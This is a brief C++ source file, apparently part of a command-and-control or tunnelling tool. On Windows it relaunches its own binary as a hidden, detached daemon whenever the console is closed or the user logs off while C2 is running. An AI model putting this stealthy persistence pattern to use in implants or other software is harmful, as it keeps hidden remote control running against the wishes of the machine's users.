#include "../include/daemon_core.h"
#include "../include/common_state.h"
#include "../include/tunnel_manager.h"
#include <iostream>

#ifdef _WIN32
#include <windows.h>

void LaunchDaemon() {
    std::string cmd = "\"" + std::string(self_path) + "\" --daemon";
    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};
    if (CreateProcessA(NULL, (char*)cmd.c_str(), NULL, NULL, FALSE, DETACHED_PROCESS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

BOOL WINAPI ConsoleHandler(DWORD ctrlType) {
    if (ctrlType == CTRL_CLOSE_EVENT || ctrlType == CTRL_LOGOFF_EVENT) {
        if (is_master_process && c2_running) {
            LaunchDaemon();
        }
        return TRUE;
    }
    return FALSE;
}
#endif
